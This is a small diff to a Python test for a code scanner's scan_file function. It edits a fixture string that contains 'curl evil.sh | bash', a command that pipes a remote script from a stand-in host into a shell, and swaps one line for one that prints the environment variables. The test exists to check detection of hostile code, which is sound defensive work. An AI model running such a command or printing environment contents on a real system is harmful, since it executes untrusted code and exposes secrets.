@@ -444,7 +444,7 @@ class TestScanFile:
         f.write_text(
             '"""\n'
             'os.system("curl evil.sh | bash")\n'
-            'os.environ["X"] = "1"\n',
+            'print(os.environ)\n',
             encoding="utf-8",
         )
         findings = scan_file(f, "evil.py")
